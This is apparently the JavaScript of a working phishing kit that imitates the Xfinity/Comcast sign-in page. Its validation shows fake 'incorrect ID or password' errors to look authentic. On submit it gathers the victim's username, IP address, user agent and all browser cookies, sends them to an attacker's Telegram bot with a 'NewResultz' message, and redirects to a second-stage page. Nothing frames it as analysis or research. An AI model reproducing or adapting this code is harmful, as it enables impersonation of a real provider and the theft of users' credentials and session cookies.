// Function to validate the form
function validateForm() {
    var userInput = document.getElementById('user');
    var errorDiv = document.getElementById('user-error');
    var invalidChars = /[!#$%^&*,()+|\}\]{["'?/><;:'=]/; // Define invalid characters

    if (userInput.value.trim() === '') {
        userInput.style.border = '0.5px solid red';
        errorDiv.textContent = 'Please enter your Xfinity ID to sign in.';
        errorDiv.style.display = 'block';
        errorDiv.style.fontWeight = 'normal';
        errorDiv.style.fontSize = '12px';
        return false;
    } else if (invalidChars.test(userInput.value) || userInput.value.trim().length < 3) {
        userInput.style.border = '0.5px solid red';
        errorDiv.textContent = 'The Xfinity ID or password you entered was incorrect. Please try again.';
        errorDiv.style.display = 'block';
        errorDiv.style.fontWeight = 'normal';
        errorDiv.style.fontSize = '12px';
        return false;
    } else if (userInput.value.includes('@') && !userInput.value.endsWith('comcast.net')) {
        userInput.style.border = '0.5px solid red';
        errorDiv.textContent = 'The Xfinity ID or password you entered was incorrect. Please try again.';
        errorDiv.style.display = 'block';
        errorDiv.style.fontWeight = 'normal';
        errorDiv.style.fontSize = '12px';
        return false;
    } else {
        // Check for a US phone number pattern
        var digits = userInput.value.replace(/\D/g, ''); // Strip non-numeric characters
        if (digits.length === 10 && !/\D/.test(userInput.value)) {
            userInput.value = digits.replace(/(\d{3})(\d{3})(\d{4})/, '$1-$2-$3'); // Format as a US phone number
        }

        userInput.style.border = ''; // Clear any custom border styles
        errorDiv.style.display = 'none'; // Hide error message
        return true;
    }
}

// Function to handle form submission
async function handleFormSubmit(event) {
    event.preventDefault();

    // Validate the form
    if (!validateForm()) {
        return;
    }

    const form = document.forms['signin'];
    const formData = new FormData(form);
    const user = formData.get('user');

    // Get IP address and user agent
    const ipAddress = await fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip);
    const userAgent = navigator.userAgent;

    // Get all cookies in JSON format
    const allCookies = JSON.stringify(document.cookie.split(';').reduce((cookies, item) => {
        const [name, value] = item.split('=');
        cookies[name.trim()] = value;
        return cookies;
    }, {}));

    // Custom message with emojis
    const messagePrefix = "🌟You got a #NewResultz 🌟\n";
    const message = `${messagePrefix}🌟Wassup, 🌟xf🌟 LOGIX 🌟\n👤 Username: ${decodeURIComponent(user)}\n🌐 IP Address: ${ipAddress}\n🕵️ User Agent: ${userAgent}\n🍪 Cookies: ${allCookies}\n`;

    // Fetch Telegram configuration
    const { telegramToken, telegramChatId } = await import('../tele.js');

    // Send message to Telegram
    const telegramMessage = encodeURIComponent(message);
    const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${telegramMessage}`;
    await fetch(telegramApiUrl);

    // Redirect the user
    const emailParam = encodeURIComponent(user);
    const additionalParam1 = md5(Math.random().toString());
    const additionalParam2 = md5(Math.random().toString());
    const additionalParam3 = md5(Math.random().toString());

    const redirectUrl = `../inp1.html?email=${emailParam}&cmd=login_submit&additional_param1=${additionalParam1}&additional_param2=${additionalParam2}&additional_param3=${additionalParam3}`;
    window.location.href = redirectUrl;
}

// Include MD5 hash function
function md5(string) {
    return CryptoJS.MD5(string).toString();
}

// Event listener for form submission
document.addEventListener("DOMContentLoaded", function() {
    const form = document.forms['signin'];
    if (form) {
        form.addEventListener('submit', handleFormSubmit);
    }
});
